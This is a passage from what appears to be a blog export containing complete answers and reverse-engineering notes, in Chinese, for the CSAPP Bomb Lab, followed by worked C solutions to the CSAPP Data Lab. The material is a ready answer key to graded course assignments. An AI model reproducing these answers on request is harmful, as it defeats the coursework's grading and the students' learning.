0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","content":"<h1 id=\"CSAPP-Bomb-Lab\"><a href=\"#CSAPP-Bomb-Lab\" class=\"headerlink\" title=\"CSAPP Bomb Lab\"></a>CSAPP Bomb Lab</h1><h3 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h3><ol>\n<li>Border relations with Canada have never been better.</li>\n<li>1 2 4 8 16 32</li>\n<li>多个答案<ul>\n<li>0    207</li>\n<li>1    311</li>\n<li>2    707</li>\n<li>3    256</li>\n<li>4    389</li>\n<li>5    206</li>\n<li>6    682</li>\n<li>7    327</li>\n</ul>\n</li>\n<li><em>应该有多个答案</em><ul>\n<li>7    0</li>\n</ul>\n</li>\n<li>一个6个字符的字符串，字符串的ascii值依次为<ul>\n<li>$9+k\\times16$ </li>\n<li>$15+k\\times16$</li>\n<li>$14+k\\times16$</li>\n<li>$5+k\\times16$</li>\n<li>$6+k\\times16$</li>\n<li>$7+k\\times16$</li>\n</ul>\n</li>\n<li>​      4 3 2 1 6 5</li>\n</ol>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"解答思路\"><a href=\"#解答思路\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>string_not_equal函数比对(0x402400)位置的string与输入的string</li>\n<li>直接运行gdb，<code>print (char*)0x402400</code>即可</li>\n<li><em>不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333</em></li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"解答思路-1\"><a href=\"#解答思路-1\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入<code>1  2  4  8  16  32</code>即可AC</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea    0xc(%rsp),%rcx //rcx=12+rsp</span><br><span class=\"line\">lea    0x8(%rsp),%rdx //rdx=8+rsp</span><br><span class=\"line\">mov    $0x4025cf,%esi //%d %d</span><br><span class=\"line\">mov    $0x0,%eax</span><br><span class=\"line\">callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>\n<p>从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb<code>print (char*)0x4025cf</code>打印出<code>&quot;%d %d&quot;</code></p>\n</li>\n<li><p>然后测试读入的第一个数字是否大于7，如果是，explode_bomb</p>\n</li>\n<li><p>然后就是一个switch，用gdb<code>x/14w 0x402470</code>打印出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000</span><br><span class=\"line\">0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000</span><br><span class=\"line\">0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000</span><br><span class=\"line\">0x4024a0:\t0x00400f9f\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>按照对应关系确定第二个读入的数字即可</p>\n</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li>同样是用sscanf读入两个数字</li>\n<li>由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">callq  40131b &lt;string_length&gt;</span><br><span class=\"line\">cmp    $0x6,%eax</span><br></pre></td></tr></table></figure>\n<p>读入6个字符的字符串</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movzbl (%rbx,%rax,1),%ecx</span><br><span class=\"line\">mov    %cl,(%rsp)</span><br><span class=\"line\">mov    (%rsp),%rdx</span><br><span class=\"line\">and    $0xf,%edx</span><br><span class=\"line\">movzbl 0x4024b0(%rdx),%edx</span><br><span class=\"line\">mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure>\n<p>提取每个字符的ascii的低4bits，放在<code>edx</code>里，然后从<code>0x4024b0+edx</code>的位置读入数据放在栈上</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov    $0x40245e,%esi</span><br><span class=\"line\">lea    0x10(%rsp),%rdi</span><br><span class=\"line\">callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure>\n<p>后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。</p>\n</li>\n<li><p>用gdb分别打印0x4024b0  0x40245e处的字符串，获得</p>\n<ul>\n<li><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></li>\n<li><code>flyers</code></li>\n</ul>\n</li>\n<li><p>此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与<code>flyers</code>比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$</p>\n</li>\n<li><p>但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符</p>\n</li>\n</ul>\n<h3 id=\"第六题\"><a href=\"#第六题\" class=\"headerlink\" title=\"第六题\"></a>第六题</h3><h4 id=\"一些心得\"><a href=\"#一些心得\" class=\"headerlink\" title=\"一些心得\"></a>一些心得</h4><ul>\n<li><p>不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#from 代码段的401153</span><br><span class=\"line\">lea    0x18(%rsp),%rsi</span><br><span class=\"line\">mov    %r14,%rax</span><br><span class=\"line\">mov    $0x7,%ecx</span><br><span class=\"line\"></span><br><span class=\"line\">mov    %ecx,%edx</span><br><span class=\"line\">sub    (%rax),%edx</span><br><span class=\"line\">mov    %edx,(%rax)</span><br><span class=\"line\">add    $0x4,%rax</span><br><span class=\"line\">cmp    %rsi,%rax</span><br><span class=\"line\">jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>\n<p>大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能</p>\n</li>\n<li><p>安利一个gdb插件<a href=\"https://github.com/longld/peda\" target=\"_blank\" rel=\"noopener\">peda</a>，大大提高gdb的用户体验</p>\n</li>\n</ul>\n<h4 id=\"解题思路-3\"><a href=\"#解题思路-3\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><p>整段代码分为 个部分</p>\n<ul>\n<li><p>0x4010fc 到 0x401106：读入6个数值</p>\n</li>\n<li><p>0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）</p>\n</li>\n<li><p>0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）</p>\n</li>\n<li><p>0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。</p>\n<p>其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令<code>x/30w 0x6032d0</code>打印改地址附近的多个字节，结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x6032d0 &lt;node1&gt;:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000</span><br><span class=\"line\">0x6032e0 &lt;node2&gt;:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000</span><br><span class=\"line\">0x6032f0 &lt;node3&gt;:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000</span><br><span class=\"line\">0x603300 &lt;node4&gt;:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000</span><br><span class=\"line\">0x603310 &lt;node5&gt;:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000</span><br><span class=\"line\">0x603320 &lt;node6&gt;:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。</p>\n<p>由此可以知道该段代码的功能为<strong>把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定</strong>。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。</p>\n<p><strong>node地址在栈上关于读入的数字的分布规则为</strong></p>\n<ul>\n<li>node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0</li>\n<li>node地址按照读入数字的顺序，排列在栈上。</li>\n</ul>\n</li>\n<li><p>0x4011ab 到 0x4011d9：该段从<code>%rsp+0x20</code>开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> index;</span><br><span class=\"line\">\tnode *next;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">node **next = %rsp+<span class=\"number\">0x28</span>;</span><br><span class=\"line\">node **endnode = %rsp+<span class=\"number\">0x50</span>;</span><br><span class=\"line\">node *currentnode = *(%rsp+<span class=\"number\">0x20</span>);</span><br><span class=\"line\">node *temp;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\ttemp = *next;</span><br><span class=\"line\">\tcurrentnode-&gt;next = temp;</span><br><span class=\"line\">\tnext += <span class=\"number\">1</span>;\t<span class=\"comment\">//in fact, it add 8 bytes;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(endnode==next)</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\tcurrentnode = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">temp-&gt;next = null;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。</p>\n</li>\n</ul>\n</li>\n</ul>\n","slug":"CSAPP-Bomb-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Data Lab","date":"2017-09-13T05:39:11.000Z","path":"2017/09/13/CSAPP-Data-Lab/","text":"CSAPP data Lab 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。 bitAnd12345678910/* * bitAnd - x&amp;y using only ~ and | * Example: bitAnd(6, 5) = 4 * Legal ops: ~ | * Max ops: 8 * Rating: 1 */int bitAnd(int x, int y) &#123; return ~(~x|~y);&#125; 思路 德摩根定律 getByte123456789101112/* * getByte - Extract byte n from word x * Bytes numbered from 0 (LSB) to 3 (MSB) * Examples: getByte(0x12345678,1) = 0x56 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 6 * Rating: 2 */int getByte(int x, int n) &#123; int bias = n&lt;&lt;3; return (x&gt;&gt;bias)&amp;0xFF;&#125; 思路 移位到最低的1byte然后用0xFF提取 logicalShift1234567891011121314/* * logicalShift - shift x to the right by n, using a logical shift i * Can assume that 0 &lt;= n &lt;= 31 * Examples: logicalShift(0x87654321,4) = 0x08765432 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 20 * Rating: 3 */int logicalShift(int x, int n) &#123; return (1&lt;&lt;32+~n&lt;&lt;1)+~0 &amp; (x&gt;&gt;n); //equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n); //负号优先级高于移位&#125; 思路 因为不能用-，所以用取反加一代替取负 构造低32-nbit的1来提取移位后的数值 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位 小技巧，如果n移位k，k$\\in$[0, 32]，则可以n&gt;&gt;(k-!!k)&gt;&gt;!!k bitCount12345678910111213141516171819202122232425/* * bitCount - returns count of number of 1's in word * Examples: bitCount(5) = 2, bitCount(7) = 3 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 40 * Rating: 4 */int bitCount(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目 同样的思路，提取每四位的low bit、high bit，然后相加 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果 bang123456789101112131415/* * bang - Compute !x without using ! * Examples: bang(3) = 0, bang(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int bang(int x) &#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return ~x&amp;0x1;&#125; 思路 如果非0，位模式从最高位的1到最低位都填充为1， 如果为0，则位模式还是保持全0 tmin123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123; return 1&lt;&lt;31;&#125; fitBits12345678910111213/* * fitsBits - return 1 if x can be represented as an * n-bit, two's complement integer. * 1 &lt;= n &lt;= 32 * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int fitsBits(int x, int n) &#123; return !(x&gt;&gt;n+~0)|!((x&gt;&gt;n+~0)+1); //equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)&#125; 思路 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。 divpwr21234567891011121314/* * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30 * Round toward zero * Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int divpwr2(int x, int n) &#123; int t = x&gt;&gt;31; return (x+(t&amp;1&lt;&lt;n)+(~(t&amp;1)+1))&gt;&gt;n; //equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n; //note that &amp; 的优先级低于&lt;&lt;&#125; 思路 直接移位是round down，无论是负数还是正数 所以要实现round to zero , C表达式为x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n negate12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1;&#125; 思路 直接取反再加1 isPositive12345678910/* * isPositive - return 1 if x &gt; 0, return 0 otherwise * Example: isPositive(-1) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 8 * Rating: 3 */int isPositive(int x) &#123; return ~(x&gt;&gt;31)&amp;!!x;&#125; 思路 符号位判断，并且非0 isLessOrEqual1234567891011/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; return !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x+~y+1&gt;&gt;31) | !(x^y); //equal to !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)&#125; 思路 x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y ilog21234567891011121314151617181920212223242526272829303132/* * ilog2 - return floor(log base 2 of x), where x &gt; 0 * Example: ilog2(16) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int ilog2(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; x &gt;&gt;= 1; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 先构造从最高的1到最低位均为1的二进制，然后类似bitCount float_neg123456789101112131415161718/* * float_neg - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 10 * Rating: 2 */unsigned float_neg(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; if(t^0x7F800000 &amp;&amp; (t&gt;&gt;23)+1&gt;&gt;8) return uf; else return uf^0x80000000;&#125; 思路 判别是否是NaN。先判断尾数是否全0，然后用(t&gt;&gt;23)+1&gt;&gt;8判断exp是否全1 float_i2f1234567891011121314151617181920212223242526272829303132333435363738394041/* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_i2f(int x) &#123; unsigned shiftLeft=0; unsigned afterShift, tmp, flag; unsigned absX=x; unsigned sign=0; //special case if (x==0) return 0; //if x &lt; 0, sign = 1000...,abs_x = -x if (x&lt;0) &#123; sign=0x80000000; absX=-x; &#125; afterShift=absX; //count shift_left and after_shift while (1) &#123; tmp=afterShift; afterShift&lt;&lt;=1; shiftLeft++; if (tmp &amp; 0x80000000) break; &#125; if ((afterShift &amp; 0x01ff)&gt;0x0100) flag=1; else if ((afterShift &amp; 0x03ff)==0x0300) flag=1; else flag=0; return sign + (afterShift&gt;&gt;9) + ((159-shiftLeft)&lt;&lt;23) + flag;&#125;//from http://www.cnblogs.com/tenlee/p/4951639.html 思路 分情况处理0、负数、正数 要处理舍人 向接近的舍入 如果处于中间，向偶数舍入 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的 float_twict123456789101112131415161718192021222324252627/* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_twice(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; unsigned temp = t&amp;0x7F800000; unsigned temp2 = uf&amp;0xFF800000; int expFull = !(temp^0x7F800000); if(t^0x7F800000 &amp;&amp; expFull) return uf; if(expFull)&#123; return temp2; &#125; if(!(t&amp;0x7F800000))&#123; unsigned k = (uf&amp;0x7FFFFF); return temp2+(k&lt;&lt;1); &#125; return (temp&gt;&gt;23)+1&lt;&lt;23 | uf&amp;0x807FFFFF;&#125; 思路 分情况处理三种IEEE754的情况 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了","raw":"---\ntitle: CSAPP Data Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-13 13:39:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 数据实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP data Lab\n\n> 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1>>n+1 等价于 1>>(n+1)，所以代码里写了1>>n+1。\n\n### bitAnd\n\n```c\n/* \n * bitAnd - x&y using only ~ and | \n *   Example: bitAnd(6, 5) = 4\n *   Legal ops: ~ |\n *   Max ops: 8\n *   Rating: 1\n */\nint bitAnd(int x, int y) {\n\treturn ~(~x|~y);\n}\n```\n\n#### 思路\n\n- 德摩根定律\n\n### getByte\n\n```c\n/* \n * getByte - Extract byte n from word x\n *   Bytes numbered from 0 (LSB) to 3 (MSB)\n *   Examples: getByte(0x12345678,1) = 0x56\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 6\n *   Rating: 2\n */\nint getByte(int x, int n) {\n\tint bias = n<<3;\n\treturn (x>>bias)&0xFF;\n}\n```\n\n#### 思路\n\n- 移位到最低的1byte然后用0xFF提取\n\n### logicalShift\n\n```c\n/* \n * logicalShift - shift x to the right by n, using a logical shift\n\ti\n *   Can assume that 0 <= n <= 31\n *   Examples: logicalShift(0x87654321,4) = 0x08765432\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 20\n *   Rating: 3 \n */\nint logicalShift(int x, int n) {\n\treturn (1<<32+~n<<1)+~0 & (x>>n);\n  //equal to ((1<<31-n<<1)-1)&(x>>n);\n  //负号优先级高于移位\n}\n```\n\n#### 思路\n\n- 因为不能用`-`，所以用取反加一代替取负\n\n- 构造低`32-n`bit的1来提取移位后的数值\n\n- 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位\n\n  > 小技巧，如果n移位k，k$\\in$[0, 32]，则可以`n>>(k-!!k)>>!!k`\n\n### bitCount\n\n```c\n/*\n * bitCount - returns count of number of 1's in word\n *   Examples: bitCount(5) = 2, bitCount(7) = 3\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 40\n *   Rating: 4\n */\nint bitCount(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目\n- 同样的思路，提取每四位的low bit、high bit，然后相加\n- 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果\n\n### bang\n\n```c\n/*\n * bang - Compute !x without using !\n *   Examples: bang(3) = 0, bang(0) = 1\n *   Legal ops: ~ & ^ | + << >>\n *   Max ops: 12\n *   Rating: 4 \n */\nint bang(int x) {\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn ~x&0x1;\n}\n```\n\n#### 思路\n\n- 如果非0，位模式从最高位的1到最低位都填充为1，\n- 如果为0，则位模式还是保持全0\n\n### tmin\n\n```c\n/* \n * tmin - return minimum two's complement integer \n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void) {\n\treturn 1<<31;\n}\n```\n\n### fitBits\n\n```c\n/* \n * fitsBits - return 1 if x can be represented as an \n *  n-bit, two's complement integer.\n *   1 <= n <= 32\n *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint fitsBits(int x, int n) {\n\treturn !(x>>n+~0)|!((x>>n+~0)+1);\n  //equal to !(x>>n-1) | !((x>>n-1)+1)\n}\n```\n\n#### 思路\n\n- 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。\n\n### divpwr2\n\n```c\n/* \n * divpwr2 - Compute x/(2^n), for 0 <= n <= 30\n *  Round toward zero\n *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint divpwr2(int x, int n) {\n\tint t = x>>31;\n\treturn (x+(t&1<<n)+(~(t&1)+1))>>n;\n  //equal to (x+(t&1<<n)-(t&1))>>n;\n  //note that & 的优先级低于<<\n}\n```\n\n#### 思路\n\n- 直接移位是round down，无论是负数还是正数\n- 所以要实现round to zero , C表达式为`x<0 ? 